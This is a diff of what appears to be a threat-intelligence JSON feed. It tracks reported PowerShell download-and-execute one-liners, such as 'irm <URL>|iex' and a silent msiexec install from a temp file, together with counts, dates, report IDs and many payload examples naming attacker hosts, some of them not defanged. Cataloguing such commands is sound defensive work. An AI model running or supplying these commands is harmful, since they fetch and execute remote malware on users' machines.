@@ -1,14 +1,11 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 155,
-    "ReportCount": 155,
-    "FirstSeen": "2026-11-13T01:23:24.624000+00:00",
+    "DistinctPayloadCount": 152,
+    "ReportCount": 152,
+    "FirstSeen": "2026-11-13T01:55:24.301000+00:00",
     "LastSeen": "2026-11-19T23:26:13.464000+00:00",
     "ReportIds": [
-      "cmweam8mu0bq30oml9mwud97d",
-      "cmweam9ea0bq60omlc6wn3tdt",
-      "cmwean10w0btt0omla09v8y3l",
       "cmwebrdpf0c2l0omlh3h75cni",
       "cmwej31qk0cf00omlfkkf1xkc",
       "cmwexrbu80epn0omlnpgz1hnh",
@@ -201,7 +198,6 @@
       "irm 'browse-cloud.codes/4d72762f0a2f414d'|iex;",
       "irm 'browse-cloud.codes/4f7aa17756c7f053'|iex;",
       "irm 'browse-cloud.codes/4fa770ffec21511f'|iex;",
-      "irm 'browse-cloud.codes/517644a705a49caa'|iex;",
       "irm 'browse-cloud.codes/57b28c7391ce18ba'|iex;",
       "irm 'browse-cloud.codes/57d18a33b935e5b2'|iex;",
       "irm 'browse-cloud.codes/59bb7d1aaac704e0'|iex;",
@@ -260,7 +256,6 @@
       "irm 'browse-cloud.codes/ae1dab8b6cf00daf'|iex;",
       "irm 'browse-cloud.codes/afdfb04a77fe289e'|iex;",
       "irm 'browse-cloud.codes/b53c663a16af799f'|iex;",
-      "irm 'browse-cloud.codes/b588d19d7447a34f'|iex;",
       "irm 'browse-cloud.codes/b703dcf1ccd9e5c8'|iex;",
       "irm 'browse-cloud.codes/b8fa79f96bd03ac8'|iex;",
       "irm 'browse-cloud.codes/b98e53a03eab894a'|iex;",
@@ -301,7 +296,6 @@
       "irm 'browse-cloud.codes/ede3d0971a4d2345'|iex;",
       "irm 'browse-cloud.codes/edef8da137f56aad'|iex;",
       "irm 'browse-cloud.codes/f1365b17cca3ee21'|iex;",
-      "irm 'browse-cloud.codes/f141a3fc3b742e21'|iex;",
       "irm 'browse-cloud.codes/f1d9f3c6a9db3b63'|iex;",
       "irm 'browse-cloud.codes/f575605f2cabbf3b'|iex;",
       "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
@@ -322,10 +316,10 @@
   },
   {
     "Pattern": "(irm '<URL>')|iex",
-    "DistinctPayloadCount": 81,
-    "ReportCount": 81,
+    "DistinctPayloadCount": 82,
+    "ReportCount": 82,
     "FirstSeen": "2026-11-13T10:16:26.023000+00:00",
-    "LastSeen": "2026-11-19T23:19:43.828000+00:00",
+    "LastSeen": "2026-11-20T00:51:39.997000+00:00",
     "ReportIds": [
       "cmwetnpgn0e5q0omlfbiurb7r",
       "cmwetonos0e7e0omltax78jeq",
@@ -407,7 +401,8 @@
       "cmwnhlqw11wtv0omlgny6ppm6",
       "cmwnlotyh1wyr0omlqyh8e3xl",
       "cmwnlp7zj1wzj0omlkec6jirx",
-      "cmwo6a5551xu40omla5b849lo"
+      "cmwo6a5551xu40omla5b849lo",
+      "cmwo9kdgz1ys80omlr22sxrni"
     ],
     "PayloadExamples": [
       "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
@@ -485,6 +480,7 @@
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/e6c7fe41a04fdf28')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/eb7b8d2ecd60505d')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/ec0b04f84abaee4a')|iex",
+      "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f8dec8b4b16293e1')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/click/08e224a04deaeb52')|iex",
       "(irm 'https://j7tracker[.]gb[.]net/gabo58lfmx/aca3a98798ec3d08')|iex",
@@ -680,9 +676,9 @@
   {
     "Pattern": "IRM <URL> | IEX",
     "DistinctPayloadCount": 8,
-    "ReportCount": 62,
+    "ReportCount": 64,
     "FirstSeen": "2026-11-13T05:58:18.016000+00:00",
-    "LastSeen": "2026-11-19T19:17:02.747000+00:00",
+    "LastSeen": "2026-11-20T01:27:50.628000+00:00",
     "ReportIds": [
       "cmwekfqsd0ciq0omld5n99u1h",
       "cmwexnoie0eja0omldix6i9jb",
@@ -745,7 +741,9 @@
       "cmwnt2anm1x7q0omlytin6ijo",
       "cmwnt3ci91x980omlku572i93",
       "cmwnt6b7q1xan0omlwi7e71xm",
-      "cmwnxm1t71xj30oml4e26u03q"
+      "cmwnxm1t71xj30oml4e26u03q",
+      "cmwoarw6c1ytk0omlfgbkqvw7",
+      "cmwoauwbm1yu70oml45lo3jkx"
     ],
     "PayloadExamples": [
       "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
@@ -832,13 +830,10 @@
   {
     "Pattern": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"<URL>\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
     "DistinctPayloadCount": 2,
-    "ReportCount": 15,
-    "FirstSeen": "2026-11-13T01:10:28.381000+00:00",
+    "ReportCount": 12,
+    "FirstSeen": "2026-11-13T01:45:15.056000+00:00",
     "LastSeen": "2026-11-17T20:46:15.496000+00:00",
     "ReportIds": [
-      "cmwea5lgf0b6n0omlk8sgo9nq",
-      "cmwea9wm70b9q0oml4v5kca0d",
-      "cmweaigu40bil0omlfmyycqdj",
       "cmwebebjc0c1o0oml57p74iht",
       "cmwel9plu0czo0omlez5ttanw",
       "cmwezgr170fas0omlma6arc0q",
